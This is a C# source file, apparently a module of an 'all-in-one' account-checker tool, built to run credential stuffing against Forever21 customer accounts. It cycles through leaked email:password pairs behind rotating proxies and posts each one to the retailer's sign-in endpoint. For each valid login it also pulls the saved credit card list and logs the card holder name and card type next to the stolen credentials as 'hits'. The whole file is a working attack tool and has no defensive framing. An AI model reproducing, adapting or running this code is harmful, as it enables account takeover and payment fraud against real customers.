using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;

namespace Forever21
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.AllowAutoRedirect = false;
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                            httpRequest.AddHeader("Pragma", "no-cache");
                            httpRequest.AddHeader("Accept", "*/*");
                            httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            string gettoken = httpRequest.Get("https://www.forever21.com/us/shop/account/signin", null).ToString();
                            string token = Check.Parse(gettoken, "window.NREUM||(NREUM={})).loader_config={xpid:\"", "\"");

                            //----------------------------------
                            httpRequest.ClearAllHeaders();
                            httpRequest.AddHeader("Host", "www.forever21.com");
                            httpRequest.AddHeader("Connection", "keep-alive");
                            httpRequest.AddHeader("Content-Length", "56");
                            httpRequest.AddHeader("Accept", "application/json, text/javascript, */*; q=0.01");
                            httpRequest.AddHeader("X-NewRelic-ID", token);
                            httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
                            httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36");
                            httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
                            httpRequest.AddHeader("Origin", "https://www.forever21.com");
                            httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
                            httpRequest.AddHeader("Sec-Fetch-Mode", "cors");
                            httpRequest.AddHeader("Sec-Fetch-Dest", "empty");
                            httpRequest.AddHeader("Referer", "https://www.forever21.com/us/shop/account/signin");
                            httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
                            httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9");
                            string str = "userid=&id=" + s[0] + "&password=" + s[1] + "&isGuest=";
                            string strResponse = httpRequest.Post("https://www.forever21.com/us/shop/Account/DoSignIn", str, "application/x-www-form-urlencoded").ToString();
                            {
                                if (strResponse.Contains("User cannot be found") || strResponse.Contains("Your email or password is incorrect. Please try again."))
                                {
                                    //bads
                                    break;
                                }
                                else if (strResponse.Contains("\"ErrorMessage\":\"\"")) //hit
                                {
                                    string UID = Check.Parse(strResponse, "\"UserId\":\"", "\"");
                                    httpRequest.AddHeader("X-NewRelic-ID", token);
                                    string postcap = "userid=" + UID;
                                    string cap = httpRequest.Post("https://www.forever21.com/us/shop/Account/GetCreditCardList", postcap, "application/x-www-form-urlencoded").ToString();
                                    if (cap.Contains("Credit Card Information cannot be found."))
                                    {
                                        ZeusAIO.mainmenu.frees++;
                                        if (Config.config.LogorCui == "2")
                                        {
                                            Console.WriteLine("[FREE - FOREVER21] " + s[0] + ":" + s[1], Color.OrangeRed);
                                        }
                                        Export.AsResult("/Forever21_frees", s[0] + ":" + s[1]);
                                        return false;
                                    }
                                    else if (cap.Contains("CardHolder") || cap.Contains("CardType") || cap.Contains("DisplayName"))
                                    {
                                        try
                                        {
                                            string Holder = Check.Parse(cap, ",\"CardHolder\":\"", "\",\"");
                                            string Type = Check.Parse(cap, ",\"CardType\":\"", "\",\"");
                                            ZeusAIO.mainmenu.hits++;
                                            if (Config.config.LogorCui == "2")
                                            {
                                                Console.WriteLine("[HIT - FOREVER21] " + s[0] + ":" + s[1] + " | Card Holder: " + Holder + " | PaymentType: " + Type, Color.Green);
                                            }
                                            Export.AsResult("/Forever21_hits", s[0] + ":" + s[1] + " | Card Holder: " + Holder + " | PaymentType: " + Type);
                                            return false;
                                        }
                                        catch
                                        {
                                            ZeusAIO.mainmenu.hits++;
                                            if (Config.config.LogorCui == "2")
                                            {
                                                Console.WriteLine("[HIT - FOREVER21] " + s[0] + ":" + s[1] + " | Error in Capture", Color.Green);
                                            }
                                            Export.AsResult("/Forever21_hits_cap_error", s[0] + ":" + s[1] + " | Error in Capture");
                                            return false;
                                        }
                                       
                                    }
                                    else
                                    {
                                        ZeusAIO.mainmenu.realretries++;
                                        goto Retry;
                                    }


                                }
                            }
                            break;
                        }
                        
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}

